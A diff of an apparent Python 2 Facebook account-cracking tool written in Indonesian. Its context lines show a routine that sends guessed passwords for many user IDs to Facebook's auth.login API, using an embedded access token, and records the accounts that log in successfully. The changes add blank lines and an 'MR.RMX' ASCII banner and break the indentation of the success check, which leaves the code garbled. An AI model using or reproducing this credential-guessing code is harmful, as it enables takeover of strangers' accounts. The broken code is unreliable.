@@ -91,6 +91,31 @@ print("\033[1;92m✓  USERNAME = RMX
 print("\033[1;92m✓  PASSWORD = NAGA 
 print("\033[1;92m✓  GUNAKAN DENGAN BIJAK!!
 
+      
+      
+      
+      
+      
+      
+      
+      
+\033[1;91m:•◈•                            __  __ _____        _____  __  ____   __
+
+:•◈•
+
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
 
 CorrectUsername = "RMX"
 CorrectPassword = "NAGA"
@@ -403,7 +428,9 @@ def pilih_super():
 													pass6 = 'Kontol'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
-													if 'access_token' in q:
+										
+		      
+		      if 'access_token' in q:
 														print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
 														oks.append(user+pass6)
 													else:
@@ -799,6 +826,30 @@ def clone_dari_file():
 	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 	menu()
 	
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+          		
+      \  033[1;91m:•◈•       __  __  _____        _____  __  ____   __
+        \033[1;91m:•◈•      |  \/  |  __ \      |  __ \|  \/  \ \ / /
+	\033[1;91m:•◈•      | \  / | |__) |     | |__) | \  / |\ V /
+        \033[1;91m:•◈•      | |\/| |  _  /      |  _  /| |\/| | > <
+        \033[1;91m:•◈•      | |  | | | \ \      | | \ \| |  | |/ . \
+        \033[1;91m:•◈•      |_|  |_|_|  \_\ (_) |_|  \_\_|  |_/_/ \_\
+		      
+		      
+		      
+		      
+		      
+		      
        
 		
 if __name__ == '__main__':
